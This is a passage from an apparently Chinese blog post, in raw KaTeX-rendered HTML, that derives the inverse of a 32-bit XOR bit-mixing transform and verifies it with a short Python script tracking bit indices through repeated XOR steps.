vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:17.91000000000001em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:19.350000000000016em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:22.790000000000013em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p>其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span></span></span></span>代表32位bit<br />已知<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span>，求<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span></span></span></span></p><p>使<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>a</mi><mn>0</mn></msub><mo>=</mo><msub><mi>a</mi><mn>0</mn></msub><mo>⊕</mo><msub><mi>a</mi><mn>11</mn></msub><mo>⊕</mo><msub><mi>a</mi><mn>15</mn></msub></mrow><annotation encoding="application/x-tex">a_{0} = a_{0} \oplus a_{11} \oplus a_{15}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，余下的式子模32递增下标<br />可得<br /><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>a</mi><mn>0</mn></msub><mo>=</mo><msub><mi>b</mi><mn>0</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>22</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>30</mn></msub></mrow><annotation encoding="application/x-tex">a_{0} = b_{0} \oplus b_{22} \oplus b_{30}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">...</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span></span></span></p><p>重复上述操作得到<br /><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>a</mi><mn>0</mn></msub><mo>=</mo><msub><mi>b</mi><mn>0</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>12</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>18</mn></msub></mrow><annotation encoding="application/x-tex">a_{0} = b_{0} \oplus b_{12} \oplus b_{18}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>于是我猜想可能在进行足够多次的迭代运算后得到的结果是<br /><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>a</mi><mn>0</mn></msub><mo>=</mo><msub><mi>b</mi><mn>0</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>0</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">a_{0} = b_{0} \oplus b_{0} \oplus b_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>即<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>a</mi><mn>0</mn></msub><mo>=</mo><msub><mi>b</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">a_{0} = b_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>编写脚本验证想法</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">equ = [</span><br><span class="line">[<span class="number">0</span>, <span class="number">11</span>, <span class="number">15</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">12</span>, <span class="number">16</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">13</span>, <span class="number">17</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">14</span>, <span class="number">18</span>],</span><br><span class="line">[<span class="number">4</span>, <span class="number">15</span>, <span class="number">19</span>],</span><br><span class="line">[<span class="number">5</span>, <span class="number">16</span>, <span class="number">20</span>],</span><br><span class="line">[<span class="number">6</span>, <span class="number">17</span>, <span class="number">21</span>],</span><br><span class="line">[<span class="number">7</span>, <span class="number">18</span>, <span class="number">22</span>],</span><br><span class="line">[<span class="number">8</span>, <span class="number">19</span>, <span class="number">23</span>],</span><br><span class="line">[<span class="number">9</span>, <span class="number">20</span>, <span class="number">24</span>],</span><br><span class="line">[<span class="number">10</span>, <span class="number">21</span>, <span class="number">25</span>],</span><br><span class="line">[<span class="number">11</span>, <span class="number">22</span>, <span class="number">26</span>],</span><br><span class="line">[<span class="number">12</span>, <span class="number">23</span>, <span class="number">27</span>],</span><br><span class="line">[<span class="number">13</span>, <span class="number">24</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">14</span>, <span class="number">25</span>, <span class="number">29</span>],</span><br><span class="line">[<span class="number">15</span>, <span class="number">26</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">16</span>, <span class="number">27</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">17</span>, <span class="number">28</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">18</span>, <span class="number">29</span>, <span class="number">1</span>],</span><br><span class="line">[<span class="number">19</span>, <span class="number">30</span>, <span class="number">2</span>],</span><br><span class="line">[<span class="number">20</span>, <span class="number">31</span>, <span class="number">3</span>],</span><br><span class="line">[<span class="number">21</span>, <span class="number">0</span>, <span class="number">4</span>],</span><br><span class="line">[<span class="number">22</span>, <span class="number">1</span>, <span class="number">5</span>],</span><br><span class="line">[<span class="number">23</span>, <span class="number">2</span>, <span class="number">6</span>],</span><br><span class="line">[<span class="number">24</span>, <span class="number">3</span>, <span class="number">7</span>],</span><br><span class="line">[<span class="number">25</span>, <span class="number">4</span>, <span class="number">8</span>],</span><br><span class="line">[<span class="number">26</span>, <span class="number">5</span>, <span class="number">9</span>],</span><br><span class="line">[<span class="number">27</span>, <span class="number">6</span>, <span class="number">10</span>],</span><br><span class="line">[<span class="number">28</span>, <span class="number">7</span>, <span class="number">11</span>],</span><br><span class="line">[<span class="number">29</span>, <span class="number">8</span>, <span class="number">12</span>],</span><br><span class="line">[<span class="number">30</span>, <span class="number">9</span>, <span class="number">13</span>],</span><br><span class="line">[<span class="number">31</span>, <span class="number">10</span>, <span class="number">14</span>]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">self_xor</span>(<span class="params">number1, number2</span>):</span></span><br><span class="line">new_equ = []</span><br><span class="line">length = <span class="built_in">len</span>(equ)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">equ1 = [x <span class="keyword">for</span> x <span class="keyword">in</span> equ[_]]</span><br><span class="line">equ2 = [x <span class="keyword">for</span> x <span class="keyword">in</span> equ[(_ + number1)%length]]</span><br><span class="line">equ3 = [x <span class="keyword">for</span> x <span class="keyword">in</span> equ[(_ + number2)%length]]</span><br><span class="line"><span class="keyword">for</span> __ <span class="keyword">in</span> equ2:</span><br><span class="line"><span class="keyword">if</span> __ <span class="keyword">in</span> equ1:</span><br><span class="line">equ1.pop(equ1.index(__))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">equ1.append(__)</span><br><span class="line"><span class="keyword">for</span> __ <span class="keyword">in</span> equ3:</span><br><span class="line"><span class="keyword">if</span> __ <span class="keyword">in</span> equ1:</span><br><span class="line">equ1.pop(equ1.index(__))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">equ1.append(__)</span><br><span class="line">new_equ.append(equ1)</span><br><span class="line"><span class="keyword">return</span> new_equ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">equ = self_xor(<span class="number">25</span>, <span class="number">13</span>)</span><br><span class="line">equ = self_xor(<span class="number">18</span>, <span class="number">26</span>)</span><br><span class="line">equ = self_xor(<span class="number">4</span>, <span class="number">20</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> equ:</span><br><span class="line">print(_)</span><br></pre></td></tr></table></figure><p>最后的输出结果可以验证想法正确，且获得了迭代异或运算的<code>shitf</code>值<br />第二条语句的逆向算法同理</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 